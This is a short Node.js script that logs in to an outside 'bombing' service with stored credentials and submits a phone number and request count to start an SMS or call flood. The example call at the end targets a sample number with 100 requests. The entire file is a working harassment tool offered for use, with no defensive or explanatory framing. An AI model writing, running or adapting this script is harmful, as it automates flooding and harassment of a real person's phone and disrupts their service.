const axios = require('axios').default;
const { CookieJar } = require('tough-cookie');
const { wrapper } = require('axios-cookiejar-support');
const cheerio = require('cheerio');
require('dotenv').config();

const email = process.env.EMAIL;
const password = process.env.PASSWORD;

const jar = new CookieJar();
const client = wrapper(axios.create({ jar }));

async function sendBomb(phone, amount) {
  try {
    // Login
    const loginRes = await client.post('https://pikachutools.my.id/user/login', {
      email,
      password
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });

    console.log("✅ Login Success");

    // Submit bombing form
    const res = await client.post('https://pikachutools.my.id/send', {
      nomor: phone,
      jumlah: amount
    });

    if (res.data && res.data.status === true) {
      console.log(`✅ Bomb started to ${phone} with ${amount} requests.`);
    } else {
      console.log(`❌ Failed:`, res.data);
    }

  } catch (err) {
    console.error("❌ Error:", err.message);
  }
}

// Example run:
sendBomb("01712345678", 100);
